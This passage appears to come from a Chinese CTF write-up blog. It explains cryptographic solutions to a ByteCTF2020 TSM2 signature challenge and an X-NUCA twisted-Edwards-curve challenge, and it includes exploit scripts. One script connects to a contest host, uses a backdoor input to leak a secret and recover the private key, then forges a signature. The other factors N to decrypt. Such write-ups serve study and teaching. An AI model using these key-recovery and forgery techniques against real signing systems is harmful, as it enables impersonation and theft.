g，是一个曲线上的点，好像没啥用啊，继续看</p><p>拿到我们的输入后，程序把k1_str和我们的输入传给了output_p1并给了输出</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def output_p1(<span class="keyword">self</span>, k1_str, r_s2_s3):</span><br><span class="line">        r = <span class="keyword">int</span>(r_s2_s3[<span class="number">0</span>:<span class="keyword">self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        s2 = <span class="keyword">int</span>(r_s2_s3[<span class="keyword">self</span>.para_len:<span class="number">2</span> * <span class="keyword">self</span>.para_len], <span class="number">16</span>)</span><br><span class="line">        s3 = <span class="keyword">int</span>(r_s2_s3[<span class="number">2</span> * <span class="keyword">self</span>.para_len:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        k1 = <span class="keyword">int</span>(k1_str, <span class="number">16</span>)</span><br><span class="line">        d1 = <span class="keyword">self</span>.sks</span><br><span class="line">        s = (d1 * k1 * s2 + d1 * s3 - r) % <span class="keyword">self</span>.n </span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">0</span> <span class="keyword">or</span> s == (<span class="keyword">self</span>.n - r):</span><br><span class="line">            <span class="keyword">return</span> None</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%064x%064x'</span> % (r, s)</span><br></pre></td></tr></table></figure><p>给的是r和s，只要s不等于0，s+r不等于n，</p><p>其中我们的输入应该是96字节的，分为三段，代表r，s2，s3，</p><p>k1是就是k1_str的整型，程序之前生成的，d1是self.sks，这在代码里头是<code>self.sks = int(func.random_hex(self.para_len), 16)</code>也是一个随机数，但是它和sk跟pks有点关系：<code>self.pks = pow((self.sk + 1) * self.sks, self.n - 2, self.n) % self.n</code></p><p>之所以扯到pks，因为程序一进去他就把这个值给我们了啊</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sk = func.random_hex(len(sm2p256v1_ecc_table[<span class="string">'n'</span>]))</span><br><span class="line">    tsm2 = TSM2(sk)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'pk:%s'</span>   %tsm2.pk)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'pks:%064x'</span>%tsm2.pks)</span><br></pre></td></tr></table></figure><p>根据pks的生成式子，其中除了sk和sks我们都知道，</p><p>所以我们应该就是要利用这个pks，sks来恢复这个sk，但是怎么获得这个sks 也即 d1 呢，</p><p><code>s = (d1 * k1 * s2 + d1 * s3 - r) % self.n</code></p><p>让s2=0，s3=1，r=0，这样就能得到 s = d1 % n了</p><p>显然d1 &lt; n ，故s = d1，并且 d1 + r != n，故能返回。</p><p>那么至此，利用链就全了。</p><h4 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h4><p>所以这道题的整个解题流程：</p><ol><li><p>构造backdoor = 191 * ‘0’ + ‘1’ 来获取sks，</p></li><li><p>利用pks来获取sk，</p></li><li><p>随便在曲线上取一个点，计算x，根据e来固定r</p></li><li><p>计算$s \equiv (2 -r*sk) *( sk+1)^{-1} \pmod n$</p></li><li><p>传入r，s，e，获取flag</p></li></ol><p>exp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from gmssl import func, sm2</span><br><span class="line">from Crypto.Util.<span class="keyword">number</span> import *</span><br><span class="line"></span><br><span class="line">from TSM2 import *</span><br><span class="line"></span><br><span class="line">sk = func.random_hex(<span class="built_in">len</span>(sm2p256v1_ecc_table[<span class="string">'n'</span>]))</span><br><span class="line">tsm2 = TSM2(sk)</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"182.92.215.134"</span>,<span class="string">"30103"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"pk:"</span>)</span><br><span class="line">pk =<span class="keyword">int</span>(<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"pks:"</span>)</span><br><span class="line">pks=<span class="keyword">int</span>(<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">tsm2.pks=pks</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"op:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"sign"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"backdoor:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"0"</span>*<span class="number">191</span>+<span class="string">"1"</span>)</span><br><span class="line">sks = <span class="keyword">int</span>(<span class="keyword">sh</span>.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">tsm2.sks=sks</span><br><span class="line">tmp = inverse(tsm2.pks,tsm2.n)</span><br><span class="line">tsm2.sk=tmp*inverse(tsm2.sks,tsm2.n)%tsm2.n-<span class="number">1</span></span><br><span class="line">tsm2.pk = tsm2._kg(tsm2.sk, tsm2.ecc_table[<span class="string">'g'</span>])</span><br><span class="line">assert <span class="keyword">int</span>(tsm2.pk,<span class="number">16</span>)==pk</span><br><span class="line"><span class="keyword">print</span>(tsm2.sk)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"op:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"verify"</span>)</span><br><span class="line"><span class="keyword">e</span>=bytes_to_long(<span class="keyword">b</span><span class="string">'Hello, Welcome to ByteCTF2020!'</span>)</span><br><span class="line"><span class="keyword">b</span> = <span class="number">2</span></span><br><span class="line">B = tsm2._kg(<span class="keyword">b</span>, tsm2.ecc_table[<span class="string">'g'</span>])</span><br><span class="line"><span class="keyword">x</span> = <span class="keyword">int</span>(B[<span class="number">0</span>:tsm2.para_len], <span class="number">16</span>)</span><br><span class="line">r = ((<span class="keyword">e</span> + <span class="keyword">x</span>) % tsm2.n)</span><br><span class="line">#b = s + (s+r)*sk</span><br><span class="line">#b = s*(<span class="number">1</span>+sk) + r*sk</span><br><span class="line">#b - r*sk</span><br><span class="line">n=<span class="number">0</span>xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123</span><br><span class="line"><span class="keyword">print</span>(tsm2.sk,)</span><br><span class="line">s = (<span class="keyword">b</span> - r*tsm2.sk)*inverse(<span class="number">1</span>+tsm2.sk,n)%n</span><br><span class="line"><span class="keyword">sign</span> = <span class="string">'%064x%064x'</span> % (r, s)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">sign</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"msg:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="string">"Hello, Welcome to ByteCTF2020!"</span>)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"sign:"</span>)</span><br><span class="line"><span class="keyword">sh</span>.sendline(<span class="keyword">sign</span>)</span><br><span class="line"><span class="keyword">sh</span>.interactive()</span><br></pre></td></tr></table></figure><h2 id="X-NUCA"><a href="#X-NUCA" class="headerlink" title="X-NUCA"></a>X-NUCA</h2><h3 id="weird"><a href="#weird" class="headerlink" title="weird"></a>weird</h3><p>需要前置知识或了解：奇异爱德华曲线</p><p>可参考资料：<a href="https://learnblockchain.cn/article/1627" target="_blank" rel="noopener">https://learnblockchain.cn/article/1627</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env sage</span><br><span class="line">from secret import FLAG</span><br><span class="line">assert FLAG.startswith(<span class="keyword">b</span><span class="string">"X-NUCA&#123;"</span>) <span class="built_in">and</span> FLAG.endswith(<span class="keyword">b</span><span class="string">"&#125;"</span>)</span><br><span class="line"></span><br><span class="line">def key_gen(bits):</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">p</span> = random_prime(<span class="number">2</span>**bits)</span><br><span class="line">        q = random_prime(<span class="number">2</span>**bits)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">p</span> % <span class="number">4</span> == <span class="number">3</span> <span class="built_in">and</span> q % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">p</span> &lt; q:</span><br><span class="line">        <span class="keyword">p</span>, q = q, <span class="keyword">p</span></span><br><span class="line">    <span class="keyword">N</span> = <span class="keyword">p</span> * q</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">x</span> = getrandbits(bits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">y</span> = getrandbits(bits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(<span class="keyword">x</span>, <span class="keyword">y</span>) == <span class="number">1</span> <span class="built_in">and</span> (<span class="keyword">x</span> * <span class="keyword">y</span>) &lt; (<span class="keyword">int</span>(<span class="built_in">sqrt</span>(<span class="number">2</span> * <span class="keyword">N</span>)) // <span class="number">12</span>):</span><br><span class="line">            <span class="keyword">e</span> = randint( <span class="keyword">int</span>(((<span class="keyword">p</span> + <span class="number">1</span>) * (q + <span class="number">1</span>) * <span class="number">3</span> * (<span class="keyword">p</span> + q) - (<span class="keyword">p</span> - q) * <span class="keyword">int</span>(<span class="keyword">N</span>**<span class="number">0.21</span>)) * <span class="keyword">y</span> / (<span class="keyword">x</span> * <span class="number">3</span> * (<span class="keyword">p</span> + q))), <span class="keyword">int</span>(((<span class="keyword">p</span> + <span class="number">1</span>) * (q + <span class="number">1</span>) * <span class="number">3</span> * (<span class="keyword">p</span> + q) + (<span class="keyword">p</span> - q) * <span class="keyword">int</span>(<span class="keyword">N</span>**<span class="number">0.21</span>)) * <span class="keyword">y</span> / (<span class="keyword">x</span> * <span class="number">3</span> * (<span class="keyword">p</span> + q))) )</span><br><span class="line">            <span class="keyword">if</span> gcd(<span class="keyword">e</span>, (<span class="keyword">p</span> + <span class="number">1</span>) * (q + <span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">k</span> = inverse_mod(<span class="keyword">e</span>, (<span class="keyword">p</span> + <span class="number">1</span>) * (q + <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">N</span>, <span class="keyword">e</span>, <span class="keyword">k</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    bits = <span class="number">1024</span></span><br><span class="line">    <span class="keyword">N</span>, <span class="keyword">e</span>, _ = key_gen(bits)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pt</span> = (<span class="keyword">int</span>.from_bytes(FLAG[:<span class="number">32</span>], <span class="string">'big'</span>), <span class="keyword">int</span>.from_bytes(FLAG[<span class="number">32</span>:], <span class="string">'big'</span>))</span><br><span class="line">    ct = (<span class="number">0</span>, <span class="number">1</span>)    </span><br><span class="line">    d = (((<span class="keyword">pt</span>[<span class="number">1</span>])**<span class="number">2</span> - <span class="number">1</span>) * inverse_mod(((<span class="keyword">pt</span>[<span class="number">1</span>])**<span class="number">2</span> + <span class="number">1</span>) * (<span class="keyword">pt</span>[<span class="number">0</span>])**<span class="number">2</span>, <span class="keyword">N</span>)) % <span class="keyword">N</span></span><br><span class="line">    </span><br><span class="line">    # <span class="number">2000</span> years <span class="keyword">later</span>...:)</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="keyword">e</span>):</span><br><span class="line">        ct = ( <span class="keyword">int</span>((ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">1</span>] + ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">0</span>]) * inverse_mod(<span class="number">1</span> + d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>] * ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>], <span class="keyword">N</span>) % <span class="keyword">N</span>), <span class="keyword">int</span>((ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>] + d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>]) * inverse_mod(<span class="number">1</span> - d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>] * ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>], <span class="keyword">N</span>) % <span class="keyword">N</span>) )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(<span class="string">"output.txt"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(str((<span class="keyword">e</span>, <span class="keyword">N</span>)).encode() + <span class="keyword">b</span><span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(str(ct).encode())</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><p>好的，第一题代码量不多，不错不错（嗯？似曾相识，危。。）首先看看他的功能，加密方式是把flag拆成了左右两份，组成一个数对，然后做了e次的操作，得到一个ct数对。这里的e次操作其实就是一个奇异爱德华曲线的一个乘法操作。（题目名不就是weird么？）所以有了e作为加密的公钥，我们自然就要找私钥d，而私钥d，（我承认我有赌的成分）d=inverse(e,(p+1) * (q+1))，（曾经在一篇paper里看到过一眼，虽然用的并非奇异爱德华曲线）</p><p><img src="https://i.loli.net/2020/12/17/CDvyNE26ImwhYZA.png" alt="image-20201102183336623"></p><p>其中p，q是大数N的一个分解。这里阶的确定不是很严格，但先试试啦。那么要这么试的话就要分解N，那就要看到这个keygen的过程了，这里p，q的生成有一点点小要求，然后就是这个e的生成，为了生成这个e，还特意整了个x，y。最后要求gcd(e, (p+1) * (q+1))，唉，这，感觉我的猜测是对的好叭。到了这里，，这还不像西湖论剑的那一道题嘛<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=100004157&idx=1&sn=ba121056137afd43cd1768c66f1cad20&chksm=7bf78b4d4c80025b9dec44e9cd33702f2a5174cafb491ddf893e5229e9e5909e1ffda4b550ec&xtrack=1&scene=0&subscene=10000&clicktime=1604313274&enterid=1604313274&ascene=7&devicetype=android-29&version=27001353&nettype=ctnet&abtest_cookie=AAACAA%3D%3D&lang=zh_CN&exportkey=A%2BEVclkqshGGX1AhhJLO4XU%3D&pass_ticket=BxnNKDSg4NDA9EVhX4ioGO7c%2Fv4T%2BEtwsPAmYnDNjByfyEKbNWLjsXUcxQLtmrfk&wx_header=1" target="_blank" rel="noopener">Wake me until May ends</a>。这道题相关的paper提到</p><p>如果e满足一定的条件，</p><p><img src="https://i.loli.net/2020/12/17/Xi7LcNKjHEbYUOJ.png" alt="image-20201102184915448"></p><p>那么x，y就会在e/N的连分数上，并且通过x和y可以获得T：p+q的一个近似。</p><p><img src="https://i.loli.net/2020/12/17/OLiZTxfQbUqVRWs.png" alt="image-20201102184201011"></p><p>那么回到这道题本身，e的取值</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e = randint( <span class="name">int</span>(((<span class="name">p</span> + <span class="number">1</span>) * (q + 1) * <span class="number">3</span> * (p + q) - (p - q) * int(<span class="name">N**0</span>.<span class="number">21</span>)) * y / (x * <span class="number">3</span> * (p + q))), int(((p + 1) * (<span class="name">q</span> + <span class="number">1</span>) * 3 * (<span class="name">p</span> + q) + (<span class="name">p</span> - q) * int(N**0.21)) * y / (<span class="name">x</span> * 3 * (<span class="name">p</span> + q))) )</span><br></pre></td></tr></table></figure><p>即$\frac{((p+1) * (q+1) * 3 * (p+q)-(p-q) * N^{0.21}) * y}{x * 3 * (p+q)}&lt;e&lt;\frac{((p+1) * (q+1) * 3 * (p+q)+(p-q) * N^{0.21}) * y}{x * 3 * (p+q)}$</p><p>即$ex-(p+1) * (q+1) * y&lt;\frac{|(p-q) * N^{0.21}|}{3(p+q)} * y$</p><p>这个范围与paper中给定的$|z|&lt;\frac{|p-q|}{3(p+q)}N^{\frac{1}{4}}y$很类似了，就是paper里头是用的$\phi(N)$，而题目用的是(p+1)(q+1)，但问题不大</p><p>$ex-(p+1) * (q+1) * y = z$</p><p>$ex - y(N + 1 + p + q) = z$</p><p>$\frac{ex}{y}-N-p-q-1 = \frac{z}{y}$</p><p>$\frac{ex}{y}-N-1 - \frac{z}{y} = p + q$</p><p>算一下$\frac{z}{y}$即$\frac{|p-q|}{3(p+q)}N^{0.21}$的大小，约为2048 * 0.21 = 430bit</p><p>现在姑且我们把$T =  \frac{ex}{y}-N-1$看作是p+q，然后计算$\rho = \frac{T+\sqrt{T^2 -4N}}{2}$，$\rho$作为p的一个近似，其中大约低430bit是不准确的。</p><p>这个时候我们就要用到RSA密码系统中用到过的<a href="https://www.anquanke.com/post/id/213821" target="_blank" rel="noopener">Factoring with high bits known</a>，</p><p><img src="https://i.loli.net/2020/12/17/fuX63akFOD4iSeg.png" alt="image-20201102192520897"></p><p>显然这里有430bit的不确定位数是满足这个关系的，于是利用这个算法我们最终能成功的分解出p，q来</p><p>然后就能算出这个私钥了。</p><p>有了私钥了，这个曲线怎么算呢？</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = (((pt<span class="string">[1]</span>)**<span class="number">2</span> - <span class="number">1</span>) * inverse_mod(((pt<span class="string">[1]</span>)**<span class="number">2</span> + <span class="number">1</span>) * (pt<span class="string">[0]</span>)**<span class="number">2</span>, N)) % N</span><br><span class="line">    </span><br><span class="line">    # <span class="number">2000</span> years later...:)</span><br><span class="line">for _ in range(e):</span><br><span class="line">        ct = ( int((ct<span class="string">[0]</span> * pt<span class="string">[1]</span> + ct<span class="string">[1]</span> * pt<span class="string">[0]</span>) * inverse_mod(<span class="number">1</span> + d * ct<span class="string">[0]</span> * pt<span class="string">[0]</span> * ct<span class="string">[1]</span> * pt<span class="string">[1]</span>, N) % N), int((ct<span class="string">[1]</span> * pt<span class="string">[1]</span> + d * ct<span class="string">[0]</span> * pt<span class="string">[0]</span>) * inverse_mod(<span class="number">1</span> - d * ct<span class="string">[0]</span> * pt<span class="string">[0]</span> * ct<span class="string">[1]</span> * pt<span class="string">[1]</span>, N) % N) )</span><br></pre></td></tr></table></figure><p>这里有个系数d，首先要计算出这个系数d</p><p>这个系数d的计算要利用到题目给的ct，</p><p>首先看到扭曲爱德华曲线的定义式</p><p><img src="https://i.loli.net/2020/12/17/2XckCxZilOrKMwt.png" alt="image-20201102193536643"></p><p>针对这一条曲线的加法公式是</p><p><img src="https://i.loli.net/2020/12/17/qNTdBZHuekX2nAJ.png" alt="image-20201102193604325"></p><p>针对这一道题他代码里的那个加法式子，我们会发现，这里相当于是扭曲爱德华曲线的系数a = -d</p><p>那么再配上一个坐标(x,y)，我们就能计算出系数d了。</p><p>其实这里可以做一个思考，这个系数d是有啥用？</p><p>我们看到这个源码里这个系数d的生成代码<code>d = (((pt[1])**2 - 1) * inverse_mod(((pt[1])**2 + 1) * (pt[0])**2, N)) % N</code></p><p>这里pt[0],pt[1]是flag明文前后两段的十进制数表示，所以d是由flag明文决定的。</p><p>我们再变换上述扭曲爱德华曲线的方程：</p><p>$ax^2 + y^2 = 1 + dx^2y^2$</p><p>$dx^2y^2+dx^2=y^2 - 1$</p><p>$d(x^2(y^2+1))=y^2 - 1$</p><p>$d = (y^2-1) * ((y^2+1) * x^2)^{-1}$</p><p>可以发现就是这个生成代码的方程式，pt[1]代表y，pt[0]代表x</p><p>所以其实这个系数d的作用就是保证flag所代表的点在这条曲线上。</p><p>好了，系数d也算出来了，怎么利用私钥来解密呢？</p><p>显然不可能直接利用原来里的这个循环去加上这些点，</p><p>信安数基中就提到过的重复倍加算法了解一下咯~</p><h4 id="解题流程-1"><a href="#解题流程-1" class="headerlink" title="解题流程"></a>解题流程</h4><p>所以这道题的整个解题流程：</p><ol><li>利用连分数得到x，y（至于怎么确定x，y. 可以根据得到的x，y的bit位数，或者用x，y计算出来的T的bit位数来判断）</li><li>利用Factoring with high bits known 分解出p，q</li><li>计算私钥 prikey = inverse(e , (p+1) * (q+1))</li><li>计算系数$d = (y^2-1) * ((y^2+1) * x^2)^{-1}$</li><li>利用重复倍加算法做一个乘法计算 mt = d * ct</li></ol><p>exp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">e</span>,<span class="keyword">N</span>=(,)</span><br><span class="line"><span class="keyword">c</span> = continued_fraction(<span class="keyword">e</span>/<span class="keyword">N</span>)</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="keyword">c</span>)):</span><br><span class="line">    <span class="keyword">y</span>=<span class="keyword">c</span>.numerator(i)</span><br><span class="line">    <span class="keyword">x</span>=<span class="keyword">c</span>.denominator(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">y</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    T = <span class="keyword">e</span>*<span class="keyword">x</span>//<span class="keyword">y</span>-<span class="keyword">N</span>-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">1023</span>&lt;(<span class="keyword">int</span>(T).bit_length()) &lt; <span class="number">1026</span>:#根据T的bit位数来确定<span class="keyword">x</span>,<span class="keyword">y</span></span><br><span class="line">        <span class="keyword">print</span>(T)</span><br><span class="line">        <span class="keyword">print</span>(<span class="keyword">x</span>,<span class="keyword">int</span>(<span class="keyword">x</span>).bit_length())</span><br><span class="line">        <span class="keyword">print</span>(<span class="keyword">y</span>,<span class="keyword">int</span>(<span class="keyword">y</span>).bit_length())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">from gmpy2 import *#Factoring with high bits known</span><br><span class="line">_p = (T+iroot(T^<span class="number">2</span>-<span class="number">4</span>*<span class="keyword">N</span>,<span class="keyword">int</span>(<span class="number">2</span>))[<span class="number">0</span>])//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">p</span> = <span class="keyword">int</span>(_p)</span><br><span class="line">n=<span class="keyword">N</span></span><br><span class="line">kbits = <span class="number">430</span></span><br><span class="line">PR.<span class="symbol">&lt;x&gt;</span> = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">f</span> = <span class="keyword">x</span> + <span class="keyword">p</span></span><br><span class="line">x0 = <span class="keyword">f</span>.small_roots(<span class="keyword">X</span>=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">p</span> = <span class="keyword">p</span>+x0</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"p: "</span>, <span class="keyword">p</span>)</span><br><span class="line">assert n % <span class="keyword">p</span> == <span class="number">0</span></span><br><span class="line">q = n/<span class="keyword">int</span>(<span class="keyword">p</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"q: "</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">x</span>,<span class="keyword">y</span>=(,)</span><br><span class="line"></span><br><span class="line">#-d*<span class="keyword">x</span>*^<span class="number">2</span> +<span class="keyword">y</span>^<span class="number">2</span> = <span class="number">1</span>+d*<span class="keyword">x</span>^<span class="number">2</span>*<span class="keyword">y</span>^<span class="number">2</span></span><br><span class="line"></span><br><span class="line">d = (<span class="number">1</span>-<span class="keyword">y</span>^<span class="number">2</span>)*inverse_mod(-<span class="keyword">x</span>^<span class="number">2</span>*<span class="keyword">y</span>^<span class="number">2</span>-<span class="keyword">x</span>^<span class="number">2</span>,<span class="keyword">N</span>)%<span class="keyword">N</span>#计算系数d</span><br><span class="line">e_inv = inverse_mod(<span class="keyword">int</span>(<span class="keyword">e</span>),<span class="keyword">int</span>((<span class="keyword">int</span>(<span class="keyword">p</span>)+<span class="number">1</span>)*(<span class="keyword">int</span>(q)+<span class="number">1</span>)))#计算私钥prikey</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(ct,<span class="keyword">pt</span>):#重复倍加算法的实现</span><br><span class="line">    ct = ( <span class="keyword">int</span>((ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">1</span>] + ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">0</span>]) * inverse_mod(<span class="number">1</span> + d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>] * ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>], <span class="keyword">N</span>) % <span class="keyword">N</span>), <span class="keyword">int</span>((ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>] + d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>]) * inverse_mod(<span class="number">1</span> - d * ct[<span class="number">0</span>] * <span class="keyword">pt</span>[<span class="number">0</span>] * ct[<span class="number">1</span>] * <span class="keyword">pt</span>[<span class="number">1</span>], <span class="keyword">N</span>) % <span class="keyword">N</span>) )</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line">def mul_by_double_adding(ct,n):</span><br><span class="line">    <span class="keyword">pt</span> = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">pt</span> = <span class="built_in">add</span>(ct, <span class="keyword">pt</span>)</span><br><span class="line">        ct = <span class="built_in">add</span>(ct, ct)</span><br><span class="line">        n = n&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">pt</span></span><br><span class="line">(<span class="keyword">x</span>,<span class="keyword">y</span>)=mul_by_double_adding((<span class="keyword">x</span>,<span class="keyword">y</span>),e_inv)#获取mt，得到flag</span><br><span class="line">from Crypto.Util.<span class="keyword">number</span> import long_to_bytes</span><br><span class="line"><span class="keyword">print</span>(long_to_bytes(<span 